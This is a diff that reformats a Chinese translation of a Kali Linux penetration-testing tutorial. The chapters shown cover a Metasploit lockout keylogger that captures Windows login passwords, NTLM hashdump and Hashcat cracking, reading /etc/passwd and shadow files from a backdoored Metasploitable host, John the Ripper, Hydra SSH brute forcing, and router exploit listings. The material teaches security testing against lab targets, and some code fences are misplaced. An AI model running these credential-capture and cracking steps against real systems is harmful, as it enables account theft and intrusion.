@@ -3816,10 +3975,13 @@ Server username: NT AUTHORITY\SYSTEM
 meterpreter >
 ```
 
-- 2. 现在只需输入“background”退出会话并返回 Meterpreter 提示符。
-- 3. 输入“use post/windows/capture/lockout_keylogger”。
-- 4. 将会话编号设置为我们活跃的会话（在我们的示例中为 3），即输入“set session 3”。
-- 5. 然后输入“exploit”：
+2. 现在只需输入 `background`退出会话并返回 Meterpreter 提示符。
+
+3. 输入 `use post/windows/capture/lockout_keylogger`。
+
+4. 将会话编号设置为我们活跃的会话（在我们的示例中为 3），即输入 `set session 3`。
+
+5. 然后输入 `exploit`：
 
 ```
 msf exploit (bypassuac) use post/windows/capture/lockout_keylogger
@@ -3834,6 +3996,7 @@ msf post (lockout_keylogger) > exploit
 ```
 
 Lockout Keylogger 会自动找到 `winlogon` 进程并迁移到那里。程序开始监控远程系统的空闲时间。
+
 当空闲时间大约达到 300 秒时，Lockout Keylogger 会尝试远程锁定用户的桌面。有时它会失败并再次尝试锁定：
 
 ```
@@ -3849,6 +4012,7 @@ Lockout Keylogger 会自动找到 `winlogon` 进程并迁移到那里。程序�
 ```
 
 好了，lockout 已成功锁定了工作站，并开始寻找击键。
+
 如果我们的用户返回并输入密码解锁系统，我们就拿到了：
 
 ```
@@ -3860,44 +4024,52 @@ msf post (lockout_keylogger) >
 ```
 
 拿到了！
+
 嗯，几乎拿到了……
+
 看起来在恢复的密码最后两个字符被截断了。不确定是程序中的密码长度缓冲区限制还是其他原因。但对于一个几年前编写的程序来说，它看起来运行得非常出色。
 
 ## 结论
 
 在本节中，我们演示了如何在 Kali 中使用 Metasploit 从远程系统捕获击键。我们还学到登录密码通常不会被记录在键盘记录中，因为 Windows 登录服务使用了不同的键盘缓冲区。但如果我们将键盘记录器移动到该进程，我们确实可以捕获登录凭据。
+
 我们还介绍了一个实用的程序，它可以将会话迁移到 `winlogon` 进程，监控系统的空闲时间，然后将其锁定，并在用户尝试重新登录时捕获密码。
 
-Lockout_Keylogger 从头到尾自动化了整个过程。用户离开电脑，脚本等待特定的空闲时间然后将计算机设置为锁定模式。然后，当他登录时，它已经设置好扫描按下的按键。
+`Lockout_Keylogger`从头到尾自动化了整个过程。用户离开电脑，脚本等待特定的空闲时间然后将计算机设置为锁定模式。然后，当他登录时，它已经设置好扫描按下的按键。
 
-密码可能是简单的密码，也可能是复杂的怪物，这并不重要。Lockout_Keylogger 会拦截它并在渗透测试员的机器上明文显示。
+密码可能是简单的密码，也可能是复杂的怪物，这并不重要。`Lockout_Keylogger`会拦截它并在渗透测试员的机器上明文显示。
 
 ## 第 21 章 - HashCat
 
 ### 资源
 
-- Hashcat - http://hashcat.net/wiki/
-- 为你的卡安装驱动 - http://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux
+- Hashcat - `http://hashcat.net/wiki/`
+
+- 为你的卡安装驱动 - `http://docs.kali.org/general-use/install-nvidia-drivers-on-kali-linux`
+
 - 字典列表 - 参见字典列表章节
 
 ## 引言
 
 到目前为止，我们涵盖了多种攻击密码的技术。我们看到有时你只需要进行彩虹表查询，而在某些情况下你也可以直接进行彩虹表查询，我们看到登录密码通常不会在键盘记录中被正常记录，因为 Windows 登录服务使用了不同的键盘缓冲区。但如果我们把键盘记录器移动到该进程，我们确实可以捕获登录凭据。
+
 我们还介绍了一个实用的程序，它可以将会话迁移到 `winlogon` 进程，监控系统的空闲时间，然后将其锁定并在用户尝试重新登录时捕获密码。
 
-Lockout_Keylogger 自动化了从开始到结束的整个过程。用户离开电脑，脚本等待特定的空闲时间然后将计算机设置为锁定模式。然后，当他登录时，它已经设置好扫描按下的按键。
+`Lockout_Keylogger`自动化了从开始到结束的整个过程。用户离开电脑，脚本等待特定的空闲时间然后将计算机设置为锁定模式。然后，当他登录时，它已经设置好扫描按下的按键。
 
-密码可能是简单的密码，也可能是复杂的怪物，这并不重要。Lockout_Keylogger 会拦截它并在渗透测试员的机器上明文显示。
+密码可能是简单的密码，也可能是复杂的怪物，这并不重要。`Lockout_Keylogger`会拦截它并在渗透测试员的机器上明文显示。
 
 ## NTLM 密码破解
 
-没有什么比破解 NTLM 哈希更有趣的了。NTLM 哈希是 Windows 身份验证的一种常见形式。在渗透测试中，获取 NTLM 哈希通常比获取明文密码容易得多。我们将学习如何使用 Hashcat 来破解这些 NTLM 哈希。
 
-Hashcat 是一个强大的密码破解工具，它利用 GPU 的性能来极大地提高破解速度。在开始之前，我们需要了解如何获取 NTLM 哈希。
+
+没有什么比破解 NTLM 哈希更有趣的了。NTLM 哈希是 Windows 身份验证的一种常见形式。在渗透测试中，获取 NTLM 哈希通常比获取明文密码容易得多。我们将学习如何使用 `Hashcat` 来破解这些 NTLM 哈希。
+
+`Hashcat` 是一个强大的密码破解工具，它利用 GPU 的性能来极大地提高破解速度。在开始之前，我们需要了解如何获取 NTLM 哈希。
 
 ## 如何获取 NTLM 哈希
 
-在之前的练习中，我们已经通过 Meterpreter 获取了明文密码。但在许多情况下，我们可能无法直接获取明文。这时，我们仍然可以获取 NTLM 哈希。
+在之前的练习中，我们已经通过 `Meterpreter` 获取了明文密码。但在许多情况下，我们可能无法直接获取明文。这时，我们仍然可以获取 NTLM 哈希。
 
 例如，我们可以使用 `hashdump` 模块：
 
@@ -3910,13 +4082,14 @@ meterpreter (post/windows/get/hashdump) > run
 该模块会列出系统上所有用户的 LM 和 NTLM 哈希。格式如下：`用户名:域名:LM:NTLM`。
 
 在我们的示例中，我们得到了类似这样的输出：
+
 `Ralf:WORKGROUP:aad3b4d3b5164093ce9fbdbdd30a11253:386668a5222293ce9fbdbd9d30a1153`
 
 这里的 NTLM 哈希是 `386668a5222293ce9fbdbd9d30a1153`。
 
 ## 使用 Hashcat 破解 NTLM 哈希
 
-现在，我们有了 NTLM 哈希。让我们使用 Hashcat 来破解它。
+现在，我们有了 NTLM 哈希。让我们使用 `Hashcat` 来破解它。
 
 首先，将哈希保存到文件中，例如命名为 `hashes.txt`：
 
@@ -3926,18 +4099,19 @@ meterpreter (post/windows/get/hashdump) > run
 
 接下来，我们需要一个字典文件。可以使用 Kali 自带的 `/usr/share/wordlists/rockyou.txt`。
 
-运行 Hashcat 命令如下：
+运行 `Hashcat` 命令如下：
 
 ```
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 其中：
+
 - `-m 1000` 指定哈希类型为 NTLM。
 - `hashes.txt` 是包含哈希的文件。
 - `/usr/share/wordlists/rockyou.txt` 是字典文件。
 
-Hashcat 将开始尝试字典中的每个密码。如果成功破解，它将显示明文密码：
+`Hashcat` 将开始尝试字典中的每个密码。如果成功破解，它将显示明文密码：
 
 ```
 Status          Mode                 Target                  Hash                               Speed.H/s
@@ -3953,16 +4127,15 @@ hashcat -m 1000 -a 3 hashes.txt ?d?8
 ```
 
 其中：
+
 - `-a 3` 表示暴力破解模式。
 - `?d?8` 表示尝试 8 位数字字符。
 
 这可能需要很长时间，取决于你的 GPU 性能。
 
+`-m 1000` 开关告诉 `hashcat` 我们的哈希是 NTLM 格式的。`Easyhash.txt` 是我们的哈希文件名。`rockyou.txt` 是我们的字典文件名，而 `-o cracked` 告诉 `hashcat` 将破解后的哈希存储在哪里。
 
-
-“-m 1000”开关告诉 hascat 我们的哈希是 NTLM 格式的。Easyhash.txt 是我们的哈希文件名。Rockyou.txt 是我们的字典文件名，而 -o cracked 告诉 hascat 将破解后的哈希存储在哪里。
-
-2. 仅仅一秒钟后，你就应该看到这个：
+仅仅一秒钟后，你就应该看到这个：
 
 ```
 rootkali:~/Desktop hascat -m 1000 Easyhash.txt rockyou.txt -o cracked.txt
@@ -3974,7 +4147,7 @@ All hashes have been recovered
 rootkali:~/Desktop#
 ```
 
-3. 使用 `cat` 命令打开 cracked.txt 文件来查看破解后的哈希：
+使用 `cat` 命令打开 `cracked.txt` 文件来查看破解后的哈希：
 
 ```
 rootkali:~/Desktop# cat cracked.txt
@@ -3998,7 +4171,7 @@ rootkali:~/Desktop#
 
 ## 破解更复杂的密码
 
-让我们看看在“密码（Password）”章节中使用 Hashcat 恢复出的某些密码。
+让我们看看在“密码（Password）”章节中使用 `Hashcat` 恢复出的某些密码。
 
 我们将使用在“密码”章节中使用 `hashdump` 命令所恢复的格式。
 
@@ -4010,18 +4183,19 @@ d660a7e8b9da7215031125663f5b89bde
 2e50e18228ad8ea406001234af4b3
 ```
 
-再次，让我们将这些保存到文本文件中，这次命名为 hash.txt，并将其放在桌面（Desktop）目录。
+再次，让我们将这些保存到文本文件中，这次命名为 `hash.txt`，并将其放在桌面（Desktop）目录。
+
 然后使用字典文件尝试破解它们。
 
-打开终端，导航到 Desktop 目录并输入“hashcat -m 1000 hash.txt -o hardcoded.txt”。
+打开终端，导航到 Desktop 目录并输入 `hashcat -m 1000 hash.txt -o hardcoded.txt`。
 
 ```
 hashcat -m 1000 hash.txt rockyou.txt -o hardcoded.txt
 ```
 
-命令行中的所有内容都与之前相同，只是我们将名称更改为新的 hash.txt，并将文件名更改为 hardcoded.txt。
+命令行中的所有内容都与之前相同，只是我们将名称更改为新的 `hash.txt`，并将文件名更改为 `hardcoded.txt`。
 
-2. 几秒钟后，我们看到了下面的字典（Dict）界面：
+几秒钟后，我们看到了下面的字典（Dict）界面：
 
 ```
 Input.Mode:Dict (rockyout.txt)
@@ -4039,7 +4213,7 @@ root@kali:~/Desktop#
 
 好的，这运行了 4 秒钟，但如果你注意到，它只能恢复 5 个哈希中的 2 个。
 
-3. 如果我们对 hardcoded.txt 运行 cat，它证实了只有两个被实际破解了：
+如果我们对 `hardcoded.txt` 运行 `cat`，它证实了只有两个被实际破解了：
 
 ```
 root@kali:~/Desktop# cat hardcoded.txt
@@ -4051,7 +4225,7 @@ root@kali:~/Desktop# cat hardcoded.txt
 
 ## 使用更大的字典
 
-如果你没有成功，请尝试更大的字典！[Crackstation](https://crackstation.net/wordlist-dictionary.htm) 有一个 15GB 的字典文件。我们下载了 4GB 的文件，解压并放入包含我们哈希的目录。然后使用字典列表运行 hashcat：
+如果你没有成功，请尝试更大的字典！[Crackstation](https://crackstation.net/wordlist-dictionary.htm) 有一个 15GB 的字典文件。我们下载了 4GB 的文件，解压并放入包含我们哈希的目录。然后使用字典列表运行 `hashcat`：
 
 ```
 root@kali:~/Crack hashcat -m 1000 hash.txt crackstation.txt -o cracked.txt
@@ -4080,18 +4254,19 @@ root@kali:~/Crack# cat cracked.txt
 3d6cffe0d1ea6a931b7c59d7e2c09c0
 d6e07aeb9da272150d12563f89de:NameIsBob
 adbf33aa0562999daea32897b20:P$$
+```
 
-好的，它破解了空密码、“P$$word”以及“NameIsBob”。剩下的两个密码相当难破解。它使用了特殊字符、大小写字母和一个数字（$Count!），最后一个非常长，接近 30 个字符。
+好的，它破解了空密码、`P$$word` 以及 `NameIsBob`。剩下的两个密码相当难破解。它使用了特殊字符、大小写字母和一个数字（`$Count!`），最后一个非常长，接近 30 个字符。
 
 ## 更高级的破解
 
-仅仅将字典文件丢哈希可以恢复一些简单的密码，但要获取更难的，你需要使用更高级的技术。我不会详细介绍它们，但 Hashcat 允许你使用多种攻击类型：
+仅仅将字典文件丢给哈希可以恢复一些简单的密码，但要获取更难的，你需要使用更高级的技术。我不会详细介绍它们，但 `Hashcat` 允许你使用多种攻击类型：
 
 - 多个字典列表
 - 规则集
 - 密码掩码
 
-**攻击类型：**“-a”选项允许你从以下选项指定要使用的攻击类型：
+**攻击类型：**`-a` 选项允许你从以下选项指定要使用的攻击类型：
 
 - 0 = 直射（Straight）
 - 1 = 组合（Combination）
@@ -4102,25 +4277,25 @@ adbf33aa0562999daea32897b20:P$$
 
 大部分都是自显明的。组合攻击允许你组合字典中的单词来创建新单词。
 
-规则攻击非常有用。Hashcat 有一组内置规则，你可以用它们来破解字典单词并尝试不同的 leet speak 版本。你甚至可以使用编程语言创建自己的规则集。
+规则攻击非常有用。`Hashcat` 有一组内置规则，你可以用它们来破解字典单词并尝试不同的 leet speak 版本。你甚至可以使用编程语言创建自己的规则集。
 
-基于规则的攻击通过使用“r”开关并包含你所需的规则名称启用。Best64.rule、passwordpro.rule、d3adone.rule 和 leetspeak.rule 是一些常用的规则。例如：
+基于规则的攻击通过使用 `r` 开关并包含你所需的规则名称启用。`Best64.rule`、`passwordpro.rule`、`d3adone.rule` 和 `leetspeak.rule` 是一些常用的规则。例如：
 
 ```
 root@kali:~/crack# hashcat -m 1000 rockyou.txt -r leetspeak.rule -o cracked.txt
 ```
 
-掩码攻击允许你定义攻击中使用的布局。例如，如果你知道密码策略要求两个数字、六个字母和两个特殊字符，你可以为 Hashcat 创建一个掩码。在这个例子中，它看起来像 ?d?d?u?u?u?u?s：
+掩码攻击允许你定义攻击中使用的布局。例如，如果你知道密码策略要求两个数字、六个字母和两个特殊字符，你可以为 `Hashcat` 创建一个掩码。在这个例子中，它看起来像 `?d?d?u?u?u?u?s`：
 
 ```
 root@kali:~/crack# hashcat -m 1000 -a 3 hash.txt ?d?d?u?u?u?u?s -o cracked.txt
 ```
 
-尝试不同的选项，直到你熟悉它们是如何运作的。某些攻击（尤其是暴力破解攻击）可能花费永远的时间。如果你有兼容的显卡，请使用基于显卡的 Hashcat 版本来加速。
+尝试不同的选项，直到你熟悉它们是如何运作的。某些攻击（尤其是暴力破解攻击）可能花费永远的时间。如果你有兼容的显卡，请使用基于显卡的 `Hashcat` 版本来加速。
 
 ## 结论
 
-这次练习的目的不仅是展示如何破解密码，而是演示密码可以有多不安全。有时作为伦理黑客或渗透测试人员，你需要破解哈希。这只是对 Hashcat 的基础介绍。当你将不同的攻击样式、规则和掩码结合在一起时，你可以创建一个非常强大的工具。
+这次练习的目的不仅是展示如何破解密码，而是演示密码可以有多不安全。有时作为伦理黑客或渗透测试人员，你需要破解哈希。这只是对 `Hashcat` 的基础介绍。当你将不同的攻击样式、规则和掩码结合在一起时，你可以创建一个非常强大的工具。
 
 希望这说明了强密码的重要性。实施要求用户使用长复杂密码的策略是保护网络的明智举措。或者更好，为你的系统实施多因素身份认证。
 
@@ -4128,7 +4303,7 @@ root@kali:~/crack# hashcat -m 1000 -a 3 hash.txt ?d?d?u?u?u?u?s -o cracked.txt
 
 ## 引言
 
-在尝试破解密码时，字典列表非常重要，因为破解程序可以读取填充密码的文件（也称为字典列表或字典文件）并使用它进行破解。大多数破解程序可以直接使用现有的密码文件，而更高级的程序可以使用密码文件（或多个文件）并对其进行处理以创建新的密码组合。例如，某些可以在字典列表中的密码开头或结尾添加字母或数字。某些程序将取两个或多个密码文件并合并单词创建一个新列表。最后，某些破解器使用规则集来修改其工作方式。某些规则会将大写字母改为小写，反反之。其他规则可以完全修改单词并生成新单词。如之前提到的，Leet (133t) Speak 规则集会将密码文件中的单词转换为“leetspeak”，用数字替换常用字母。使用通配符可以让密码破解变得简单且快速。许多渗透人员会使用公司数据、员工姓名、电话号码、电子邮件等创建自己的密码列表。
+在尝试破解密码时，字典列表非常重要，因为破解程序可以读取填充密码的文件（也称为字典列表或字典文件）并使用它进行破解。大多数破解程序可以直接使用现有的密码文件，而更高级的程序可以使用密码文件（或多个文件）并对其进行处理以创建新的密码组合。例如，某些可以在字典列表中的密码开头或结尾添加字母或数字。某些程序将取两个或多个密码文件并合并单词创建一个新列表。最后，某些破解器使用规则集来修改其工作方式。某些规则会将大写字母改为小写，反之亦然。其他规则可以完全修改单词并生成新单词。如之前提到的，Leet (133t) Speak 规则集会将密码文件中的单词转换为“leetspeak”，用数字替换常用字母。使用通配符可以让密码破解变得简单且快速。许多渗透人员会使用公司数据、员工姓名、电话号码、电子邮件等创建自己的密码列表。
 
 但我们在哪里可以找到字典列表？
 
@@ -4136,11 +4311,11 @@ root@kali:~/crack# hashcat -m 1000 -a 3 hash.txt ?d?d?u?u?u?u?s -o cracked.txt
 
 Kali 自带了一些列表，问题在于找到它们。大部分位于使用它们的主程序目录。
 
-> （在最新版本的 Kali 中，其他字典列表的快捷方式存储在“usr/share/wordlists”目录）
+> （在最新版本的 Kali 中，其他字典列表的快捷方式存储在 `/usr/share/wordlists` 目录）
 
 ## ROCKYOU 字典列表
 
-最流行的可能是 RockYou 字典列表。这是一个包含数百万实际使用的密码的巨大集合，是从数据库转储中提取的。文件位于 /usr/share/wordlists/ 目录，如下：
+最流行的可能是 RockYou 字典列表。这是一个包含数百万实际使用的密码的巨大集合，是从数据库转储中提取的。文件位于 `/usr/share/wordlists/` 目录，如下：
 
 ```
 root@kali:/usr/share# cd wordlists/
@@ -4149,7 +4324,6 @@ rockyou.txt.gz
 ```
 
 如果你注意到，密码列表是压缩过的，因此在使用之前我们需要对其解压：
-
 
 ```bash
 root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
@@ -4172,14 +4346,14 @@ root@kali:/usr/share/john#
 
 # WFUZZ 多重字典文件
 
-Wufzz 是一个网站暴力破解工具。虽然并不是所有的字典文件都有用，但某些非常有意思，特别是“general”（通用）目录下的那些。
+`Wfuzz` 是一个网站暴力破解工具。虽然并不是所有的字典文件都有用，但某些非常有意思，特别是“general”（通用）目录下的那些。
 
-文件位于 `/usr/share/wufzz/wufzz/` 目录，如下所示：
+文件位于 `/usr/share/wfuzz/wfuzz/` 目录，如下所示：
 
 ```bash
-root@kali:/usr/share/wufzz/wufzz/# ls
+root@kali:/usr/share/wfuzz/wfuzz/# ls
 fuzzdb general Injections others stress vulns webersicces
-root@kali:/usr/share/wufzz/wordlist#
+root@kali:/usr/share/wfuzz/wordlist#
 ```
 
 # 其他字典文件
@@ -4188,15 +4362,15 @@ root@kali:/usr/share/wufzz/wordlist#
 
 # 字典文件生成器
 
-Kali 中的几个工具可以让你创建自己的个性化字典文件。CeWL 非常不错，因为它让你通过从目标网站获取信息来创建密码。Crunch 也很好，因为它允许你从零开始创建自定义字典文件。
+Kali 中的几个工具可以让你创建自己的个性化字典文件。`CeWL` 非常不错，因为它让你通过从目标网站获取信息来创建密码。`Crunch` 也很好，因为它允许你从零开始创建自定义字典文件。
 
-在本节中，我们将查看 Crunch。
+在本节中，我们将查看 `Crunch`。
 
 # Crunch
 
-Crunch 是一个非常强大的程序，允许你创建自己的密码列表。只需输入你想要的字符、长度和复杂度，Crunch 就会为你生成！
+`Crunch` 是一个非常强大的程序，允许你创建自己的密码列表。只需输入你想要的字符、长度和复杂度，`Crunch` 就会为你生成！
 
-要打开 Crunch 的帮助页面，你需要使用 `man` 命令：
+要打开 `Crunch` 的帮助页面，你需要使用 `man` 命令：
 
 ```bash
 root@Kali:~# man crunch
@@ -4208,61 +4382,69 @@ root@Kali:~# man crunch
 crunch
 
 ## 概要
-<min-len> <max-len> [options]
+`<min-len> <max-len> [options]`
 
 ## 描述
-Crunch 可以根据你指定的标准创建字典文件。crunch 的输出可以发送到屏幕、文件或其他程序。
+`Crunch` 可以根据你指定的标准创建字典文件。`crunch` 的输出可以发送到屏幕、文件或其他程序。
 
-## 
+## 参数
 
-min-len
+`min-len`
 你想要开始的最小字符串长度。即使参数不使用该值，此选项也是必须的。
 
-max-len
+`max-len`
 你想要结束的最大字符串长度。即使参数不使用该值，此选项也是必须的。
 
-但基本上我们只需要告诉 crunch 最小和最大长度，以及使用什么种类型的字符。
+但基本上我们只需要告诉 `crunch` 最小和最大长度，以及使用什么种类型的字符。
 
-Crunch 还大量使用了位于其安装目录 `/etc/share/crunch` 的 `charset.lst` 文件。因此，你需要从该目录运行 crunch，或者在使用更高级的字符集（如下所示）时使用 `-f` 关指向该目录。
+`Crunch` 还大量使用了位于其安装目录 `/etc/share/crunch` 的 `charset.lst` 文件。因此，你需要从该目录运行 `crunch`，或者在使用更高级的字符集（如下所示）时使用 `-f` 开关指向该目录。
 
 好了，让我们从一个简单的例子开始。
 
 例如：
 
 ```bash
+
+
+
 root@Kali:~# crunch 1 3 -o ThreeLetters.txt
-```
 
 将产生类似的内容：
 
-- - a, b, c, d, e, f, g, h, i, j, et...
+- a, b, c, d, e, f, g, h, i, j, et...
 - aa, ab, ac, ad, ae, af, ag, ah, ai, aj, et...
 - aaa, aab, aac, aad, aae, aag, aah, aai, aaj, et...
 
-基本上 crunch 从单个字母“a”开始，循环所有排列，直到达到“zzz”。
+基本上`crunch`从单个字母“a”开始，循环所有排列，直到达到“zzz”。
 
 如果我们尝试不同的选项，就可以创建更复杂的列表，例如：
 
 ```bash
 root@kali:/usr/share/crunch$ crunch 3 4abcd1234 -o alphaNumeric.txt
-Crunch 现在将生成以下量的数据：35721 bytes
-0 MB
-0 GB
-0 TB
-0 PB
-Crunch 现在将生成以下数量的行：7290
-100%
 ```
 
-这将创建一个以“aaa”开头并以“4444”结尾的字典文件，创建如 aal, bb3, 2a21 和 e3da 这样的字母数字数字组合。
+`Crunch`现在将生成以下量的数据：35721 bytes
 
-我们使用 `charset.lst` 文件，这样我们就不需要输入所有实际想要使用的字符，如果执行执行“cat charset.lst”，可以查看可用的命令：
+0 MB
+
+0 GB
+
+0 TB
+
+0 PB
+
+`Crunch`现在将生成以下数量的行：7290
+
+100%
+
+这将创建一个以“aaa”开头并以“4444”结尾的字典文件，创建如`aal`、`bb3`、`2a21`和`e3da`这样的字母数字数字组合。
+
+我们使用`charset.lst`文件，这样我们就不需要输入所有实际想要使用的字符，如果执行执行`cat charset.lst`，可以查看可用的命令：
 
 ```bash
 root@kali:/usr/share/charset# cat charset.lst
-# winrtgen v1.2 配置文件来自 Massiliano Montoro (maoox<
+# winrtgen v1.2 配置文件来自 Massiliano Montoro (maoox<)
 # 兼容 rainbowcrack 1 及后续版本来自 Zhu Shanglei <shangelei@hotmail.com>
-
 hex-lower = [0123456789abcdef]
 hex-upper = [0123456789ABCDEF]
 numeric = [0123456789]
@@ -4279,17 +4461,21 @@ alpha-space = [ABCDEFGHIJKLMNOPghijklmnopqrstuvwxyz]
 
 ```bash
 root@kali:/usr/share/crunch# crunch 2 4 -f charset.lst alpha-numeric-all -o mix.txt
-Crunch 现在将生成以下数据：39374 bytes
-375 MB
-0 GB
-Crunch 现在将生成以下数量的行：78916
 ```
+
+`Crunch`现在将生成以下数据：39374 bytes
+
+375 MB
+
+0 GB
+
+`Crunch`现在将生成以下数量的行：78916
 
 花费了一点时间，但创建了一个包含 2 到 4 位字母、数字和符号的字典文件，这意味着你可以从某个单词开始，或者拥有第一部分和最后部分。这并不至关重要，因为一些高级的破解程序会自动完成这一点。
 
-# 下载字典文件
+## 下载字典文件
 
-如果上述信息没有帮助，或者你想要更多的字典文件，你也可以从网上下载。我过的最好的网站是 Skull Security 和 CrackStation。
+如果上述信息没有帮助，或者你想要更多的字典文件，你也可以从网上下载。我过的最好的网站是`Skull Security`和`CrackStation`。
 
 - **Skull Security:** http://www.security.org/wiki/index.php
 - **CrackStation:** https://crackstation.net/buy-wordlist.htm 有几个被称为字典之母的地方！
@@ -4298,11 +4484,11 @@ Crunch 现在将生成以下数量的行：78916
 
 许多破解程序在使用字典文件时运行得更好。如果你有时间和耐心，你可以创建一个非常大的列表。互联网提供了一些你可以下载和使用的字典文件。
 
-# 第23 章 破解 Linux 密码
+# 第23章 破解 Linux 密码
 
 ## 引言
 
-在 Windows 中密码可以被破解，在 Linux 机器上也可以这样做。正如我们之前所描述的，我们通过使用 Metasploitable 漏洞获得了“root”权限。让我们以 Metasploitable 为起点：
+在 Windows 中密码可以被破解，在 Linux 机器上也可以这样做。正如我们之前所描述的，我们通过使用`Metasploitable`漏洞获得了“root”权限。让我们以`Metasploitable`为起点：
 
 ```bash
 [*] Sending backdoor command...
@@ -4319,7 +4505,7 @@ sh: line 3: Escape: not found
 root
 ```
 
-好的，我们有一个远程 shell，我是 root 用户。现在我们需要的是恢复密码哈希值然后破解它们。简单地输入“cat /etc/passwd”：
+好的，我们有一个远程 shell，我是 root 用户。现在我们需要的是恢复密码哈希值然后破解它们。简单地输入`cat /etc/passwd`：
 
 ```
 root:x:0:root:/bin/bash
@@ -4366,26 +4552,23 @@ stat:x:114:65534:/var/lib/nfs/bin/sh
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_181_0.png)
 
-现在对“shadow-\”文件执行完全相同的操作。
+现在对“shadow-”文件执行完全相同的操作。
 
+现在你的 Kali 系统中应该有两个文件：`root/Desktop/passwd`和`root/Desktop/shadow-`。
 
-
-
-现在你的 Kali 系统中应该有两个文件：`root/Desktop/passwd` 和 `root/Desktop/shadow-`。
-
-接下来，我们需要获取这两个新创建的文本文件，并运行 John Ripper 工具集中的 `unshadow` 命令对它们进行处理。该命令会将文件合并成一个名为 `cracked` 的文件，John the Ripper 就可以破解该文件：
+接下来，我们需要获取这两个新创建的文本文件，并运行`John Ripper`工具集中的`unshadow`命令对它们进行处理。该命令会将文件合并成一个名为`cracked`的文件，`John the Ripper`就可以破解该文件：
 
 ```
 root@kali:~# sudo unshadow passwd shadow- cracked
 ```
 
-好了，现在我们已经有了合并后的 `cracked` 文件，可以对它释放 John the Ripper 尝试尝试找回密码了。
+好了，现在我们已经有了合并后的`cracked`文件，可以对它释放`John the Ripper`尝试尝试找回密码了。
 
-我们将使用 John 附带的词列表文件 `password.lst`：
+我们将使用`John`附带的词列表文件`password.lst`：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_182_0.png)
 
-好了，有 7 个密码哈希，只剩下 1 个。现在使用 `show` 命令查看它发现了什么：
+好了，有 7 个密码哈希，只剩下 1 个。现在使用`show`命令查看它发现了什么：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_182_1.png)
 
@@ -4402,11 +4585,11 @@ root@kali:~# sudo unshadow passwd shadow- cracked
 
 # 使用 Hydra 自动化密码攻击
 
-现在我们已经有了这些密码，可以获取它们并使用“Hydra”对 Metasploitable 系统的服务进行自动化攻击。
+现在我们已经有了这些密码，可以获取它们并使用“Hydra”对`Metasploitable`系统的服务进行自动化攻击。
 
-Hydra 是一个暴力破解攻击程序，它可以接收用户列表和密码列表，并尝试它们的不同组合来攻击服务器。
+`Hydra`是一个暴力破解攻击程序，它可以接收用户列表和密码列表，并尝试它们的不同组合来攻击服务器。
 
-如果我们创建一个包含用户名的文本文件，另一个包含上述获取的密码文件，就可以将它们输入 Hydra 等程序，通过自动测试这些密码来看看哪些服务可以攻破。
+如果我们创建一个包含用户名的文本文件，另一个包含上述获取的密码文件，就可以将它们输入`Hydra`等程序，通过自动测试这些密码来看看哪些服务可以攻破。
 
 所以，如果我们想用新创建的密码攻击 SSH 服务，可以这样操作：
 
@@ -4430,18 +4613,19 @@ Hydra (http://www.thec.org/hydra) finished at 2013-11-02 16:36:02
 root@Desktop #
 ```
 
-“-L” 参数列出我们的用户名文件，在本例中是“user”。“-P” 参数是我们的密码文件位置，在本例中是“pass”。然后我们只需列出目标 IP 地址和目标服务即可！
+
+
+“-L”参数列出我们的用户名文件，在本例中是`user`。“-P”参数是我们的密码文件位置，在本例中是`pass`。然后我们只需列出目标 IP 地址和目标服务即可！
 
 （如果你更喜欢图形化界面，可以使用“在线密码攻击”菜单中的 Hydra-GTK）
 
-如你所见，我们很快找到了用户名和密码的正确组合：
-msfadmin/ msfadmin
+如你所见，我们很快找到了用户名和密码的正确组合：`msfadmin/msfadmin`。
 
-虽然尝试我们已经知道的小型密码列表有点愚蠢，但这个概念是可靠的。在没有任何实际密码的情况下，我们可以使用 hydra 配合大型用户名文件和字典文件来尝试暴力破解服务器。
+虽然尝试我们已经知道的小型密码列表有点愚蠢，但这个概念是可靠的。在没有任何实际密码的情况下，我们可以使用`hydra`配合大型用户名文件和字典文件来尝试暴力破解服务器。
 
 ## 结论
 
-以上就是全部内容。因为我们拥有 root shell，所以我们能够通过将哈希值复制并粘贴到本地机器，从它们那里获取 Linux 哈希值。然后，我们就可以使用 John Ripper 来破解它们了。
+以上就是全部内容。因为我们拥有 root shell，所以我们能够通过将哈希值复制并粘贴到本地机器，从它们那里获取 Linux 哈希值。然后，我们就可以使用`John Ripper`来破解它们了。
 
 如果你仔细观察之前教程中提到的 Metasploit 服务扫描程序，你可能会注意到某些程序留有设置用户名和密码的地方。如果将我们新破解的密码直接输入到这些扫描器并让它们释放到 Metasploitable 机器上，将会怎样？
 
@@ -4466,7 +4650,7 @@ msfadmin/ msfadmin
 
 我们将查看路由器和无线网络被攻击的几种方法。
 
-在本章中，我们将查看“Routerpwn”，这是一个包含路由器可执行漏洞的网站。然后，我们将查看攻击 Wi-Fi 安全设置 (WPS) —— 一种基于按钮或 PIN 码设置 WPA/WPA2 网络的方法。
+在本章中，我们将查看`Routerpwn`，这是一个包含路由器可执行漏洞的网站。然后，我们将查看攻击 Wi-Fi 安全设置（WPS）—— 一种基于按钮或 PIN 码设置 WPA/WPA2 网络的方法。
 
 在接下来的章节中，我们将更深入地涵盖 Wi-Fi 网络的攻击。
 
@@ -4486,7 +4670,7 @@ msfadmin/ msfadmin
 
 ## Routerpwn
 
-虽然没有包含在 Kali 中，但 Routerpwn.com 可能是寻找路由器漏洞最简单的网站之一。该网页按制造商分类提供了路由器漏洞以及多种工具：
+虽然没有包含在 Kali 中，但`Routerpwn.com`可能是寻找路由器漏洞最简单的网站之一。该网页按制造商分类提供了路由器漏洞以及多种工具：
 
 | | | | |
 | :--- | :--- | :--- | :--- |
@@ -4518,7 +4702,7 @@ msfadmin/ msfadmin
 
 （注：由于原文中表格存在大量重复的行项，译文已保持其格式结构）
 
-要使用 Routerpn，只需点击制造商。下方是漏洞列表，显示日期、概要描述以及设置 IP 的选项：![](img/ff9cd19afe449ae54278ee429e668a6f_187_0)
+要使用`Routerpwn`，只需点击制造商。下方是漏洞列表，显示日期、概要描述以及设置 IP 的选项：![](img/ff9cd19afe449ae54278ee429e668a6f_187_0)
 
 | | | | |
 | :--- | :--- | :--- | :--- |
@@ -4532,21 +4716,17 @@ msfadmin/ msfadmin
 | 12/17/11 | [+] | DAP-1150 | |
